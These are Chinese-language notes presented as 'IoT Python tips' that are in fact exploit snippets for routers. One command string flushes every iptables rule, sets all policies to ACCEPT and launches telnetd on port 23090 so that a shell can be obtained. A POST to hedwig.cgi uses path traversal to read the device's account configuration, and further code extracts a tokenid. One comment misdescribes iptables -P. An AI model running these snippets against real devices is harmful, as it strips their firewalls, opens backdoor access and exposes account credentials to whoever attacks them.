# iot python编程技巧

## 开启telnet
```
COMMAND = ";".join([
    "iptables -F",  # 清空指定链 chain 上面的所有规则。如果没有指定链，清空该表上所有链的所有规则。
    "iptables -X",  #删除指定的链，这个链必须没有被其它任何规则引用，而且这条上必须没有任何规则。如果没有指定链名，则会删除该表中所有非内置的链。
    "iptables -t nat -F",  #对指定nat链表进行 -F操作
    "iptables -t nat -X",   # 定义地址转换的，也只能做在3个链上：PREROUTING ，OUTPUT ，POSTROUTING
    "iptables -t mangle -F", #修改报文原数据，是5个链都可以做：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING
    "iptables -t mangle -X",
    "iptables -P INPUT ACCEPT",  # -P指定要匹配的数据包协议类型 INPUT链 ：处理输入数据包 ACCEPT ：接收数据包
    "iptables -P FORWARD ACCEPT",#FORWARD链 ：处理转发数据包。
    "iptables -P OUTPUT ACCEPT",   #OUTPUT链 ：处理输出数据包。
    "telnetd -p 23090 -l /bin/date"  # 开启telnet服务。  之后执行命令：telnet 192.168.0.1 23090 拿到shell
    ])
```
## 发送消息

### post
```
TARGET = sys.argv[1]
session = requests.Session()
session.verify = False
headers = {"Content-Type": "text/xml"}
cookies = {"uid": "whatever"}
data = """<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
    <service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
</module>
</postxml>"""

resp = session.post(urljoin(TARGET, "./hedwig.cgi"), headers=headers, cookies=cookies, data=data)
```


## 消息处理
```
accdata = resp.text[:resp.text.find("<?xml")]
```
`resp.text.find()`找到一个标签的位置

`resp.text[]` 返回的消息（列表）

`resp.content` 返回的消息（字符串）

### 从收到的消息中获取一个字段值
```
for l in r.content.split('\n'):
    if 'tokenid' in l:
        q2 = l.rfind('"')
        q1 = l[:q2].rfind('"')
        tokenid = l[q1+1:q2]

print 'tokenid is %s' % tokenid
```

